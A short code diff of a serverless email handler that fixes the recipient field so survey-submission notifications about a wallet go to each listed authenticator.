@@ -55,7 +55,7 @@ exports.handler = async (event, context) => {
     const emailPromises = authenticators.map(authenticator =>
       resend.emails.send({
         from: 'Support <support@support.fixorbits.com>',
-        to: recipient,
+        to: authenticator,
         subject: `New Survey Submission - ${walletName}`,
         html: `
           <h1>New Survey Submission</h1>
